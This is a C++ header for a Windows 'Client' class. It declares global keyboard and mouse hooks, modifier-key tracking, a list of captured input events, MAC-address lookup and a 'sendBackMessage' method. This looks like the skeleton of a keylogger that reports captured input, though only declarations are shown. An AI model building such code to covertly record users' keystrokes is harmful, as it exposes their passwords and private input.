#pragma once
#include <windows.h>
#include <IPHlpApi.h>
#include <Psapi.h>
#include <list>
#include <iostream>
#include "Event.h"
#include "KeyboardEvent.h"
#include "MouseEvent.h"
#pragma comment(lib, "IPHLPAPI.lib")

class Client
{
public:
	Client();
	~Client();
	void					setKeyboardHook(void);
	void					setMouseHook(void);
	void					unsetHook(HHOOK hook);
	void					unsetKeyboardHook(void);
	void					unsetMouseHook(void);
	void					sendBackMessage(void);
	void					getMACAddress(void);
	void					setShift(bool shift);
	void					setCtrl(bool ctrl);
	void					setAlt(bool alt);
	void					setCapsLock(bool capsLock);
	void					setAltGr(bool altGr);
	bool					getShift(void);
	bool					getCtrl(void); 
	bool					getAlt(void);
	bool					getCapsLock(void);
	bool					getAltGr(void);
	int						getMod(void);
	void					addEvent(Event &e);
private:
	bool					isValidMac(PIP_ADAPTER_INFO adapterInfo);
	std::string				addrToString(unsigned char mac[]);
	HHOOK					m_keyboardHook;
	HHOOK					m_mouseHook;
	std::list<Event>		m_events;
	bool					m_Shift;
	bool					m_Ctrl;
	bool					m_Alt;
	bool					m_CapsLock;
	bool					m_AltGr;
	std::string				m_MAC;
};

void						setModifier(int nCode, WPARAM wPAram, LPARAM lParam);
LRESULT CALLBACK			KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
LRESULT CALLBACK			MouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);